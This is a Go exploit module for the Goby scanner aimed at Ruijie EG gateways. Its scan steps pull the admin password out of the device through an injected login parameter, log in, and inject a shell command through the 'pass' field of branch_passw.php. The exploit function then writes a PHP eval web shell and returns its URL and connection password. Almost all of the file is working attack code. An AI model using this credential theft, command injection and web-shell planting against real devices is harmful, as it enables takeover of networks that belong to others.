package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
)

func init() {
	expJson := `{
    "Name": "Ruijie EG login password command execution Getshell",
    "Description": "The Ruijie EG device has a file upload vulnerability. Anyone can use the Ruijie EG front desk to cooperate with the sandbox to upload files and Getshell to obtain device permissions.",
    "Product": "Ruijie-EG",
    "Homepage": "http://www.ruijie.com.cn/",
    "DisclosureDate": "2019-09-27",
    "Author": "atdpa4sw0rd@gmail.com",
    "FofaQuery": "app=\"Ruijie-EG\" || app=\"RUIJIE-EG easy gateway\" || title=\"锐捷网络-EWEB网管系统\"",
    "Level": "3",
    "Impact": "",
    "Recommendation": "",
    "References": [
        "https://fofa.so/"
    ],
    "HasExp": true,
    "ExpParams": null,
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/login.php",
                "follow_redirect": false,
                "header": {
                    "Accept": "application/json, text/javascript, */*; q=0.01",
                    "Content-Type": "application/x-www-form-urlencoded",
                    "X-Requested-With": "XMLHttpRequest"
                },
                "data_type": "text",
                "data": "username=admin&password=admin?show+webmaster+user"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "admin",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "pass|lastbody|regex|admin (.*?)(\\\\r|\")",
                "cook1|lastheader|regex|(RUIJIEID\\=.*\\;)"
            ]
        },
        {
            "Request": {
                "method": "POST",
                "uri": "/login.php",
                "follow_redirect": false,
                "header": {
                    "Accept": "application/json, text/javascript, */*; q=0.01",
                    "Content-Type": "application/x-www-form-urlencoded",
                    "X-Requested-With": "XMLHttpRequest"
                },
                "data_type": "text",
                "data": "username=admin&password={{{pass}}}"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        },
        {
            "Request": {
                "method": "POST",
                "uri": "/itbox_pi/branch_passw.php?a=set",
                "follow_redirect": false,
                "header": {
                    "Accept": "application/json, text/javascript, */*; q=0.01",
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Cookie": "{{{cook1}}}",
                    "X-Requested-With": "XMLHttpRequest"
                },
                "data_type": "text",
                "data": "pass=|echo 'vbdlxnlgsn153439'>ruijieruijieruijie.txt"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        },
        {
            "Request": {
                "method": "GET",
                "uri": "/itbox_pi/ruijieruijieruijie.txt",
                "follow_redirect": false,
                "header": {
                    "Accept": "application/json, text/javascript, */*; q=0.01",
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Cookie": "{{{cook1}}}",
                    "X-Requested-With": "XMLHttpRequest"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "vbdlxnlgsn153439",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": null,
    "Tags": [
        "getshell"
    ],
    "CVEIDs": null,
    "CVSSScore": null,
    "AttackSurfaces": {
        "Application": [
            "Ruijie--EWEB"
        ],
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": [
            "Ruijie-EG"
        ]
    },
    "PocId": "10174"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cfg := httpclient.NewPostRequestConfig("/login.php")
			cfg.Header.Store("Accept", "application/json, text/javascript, */*; q=0.01")
			cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			cfg.Header.Store("X-Requested-With", "XMLHttpRequest")
			cfg.Data = "username=admin&password=admin?show+webmaster+user"
			resp1, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg)
			//fmt.Print(resp1.Cookie + "\n")
			//fmt.Print(resp1.Utf8Html)
			if err != nil {
				return expResult
			}
			var cook []string
			var passwd []string
			syst := regexp.MustCompile("RUIJIEID=(.*;)")
			cook = syst.FindStringSubmatch(resp1.Cookie)
			syst2 := regexp.MustCompile("admin (.*?)\"")
			passwd = syst2.FindStringSubmatch(resp1.Utf8Html)

			if len(cook) >= 2 && len(passwd) >= 2 {
				cfg2 := httpclient.NewPostRequestConfig("/login.php")
				cfg2.Header.Store("Accept", "application/json, text/javascript, */*; q=0.01")
				cfg2.Header.Store("Content-Type", "application/x-www-form-urlencoded")
				cfg2.Header.Store("Cookie", "RUIJIEID="+cook[1])
				cfg2.Header.Store("X-Requested-With", "XMLHttpRequest")
				cfg2.Data = "username=admin&password=" + passwd[1]
				_, err2 := httpclient.DoHttpRequest(expResult.HostInfo, cfg2)
				if err2 != nil {
					return expResult
				}

				cfg3 := httpclient.NewPostRequestConfig("/itbox_pi/branch_passw.php?a=set")
				cfg3.Header.Store("Accept", "application/json, text/javascript, */*; q=0.01")
				cfg3.Header.Store("Content-Type", "application/x-www-form-urlencoded")
				cfg3.Header.Store("Cookie", "RUIJIEID="+cook[1])
				cfg3.Header.Store("X-Requested-With", "XMLHttpRequest")
				randname := goutils.RandomHexString(8)
				pass := goutils.RandomHexString(4)
				cfg3.Data = "pass=|echo '<?php @eval($_POST['" + pass + "]);?>'>" + randname + ".php"
				resp3, err3 := httpclient.DoHttpRequest(expResult.HostInfo, cfg3)
				if err3 == nil && resp3.StatusCode == 200 {
					expResult.Success = true
					expResult.Output = expResult.HostInfo.FixedHostInfo + "/itbox_pi/" + randname + ".php (Connection Password:" + pass + ")"
					return expResult
				}
			}
			return expResult
		},
	))
}
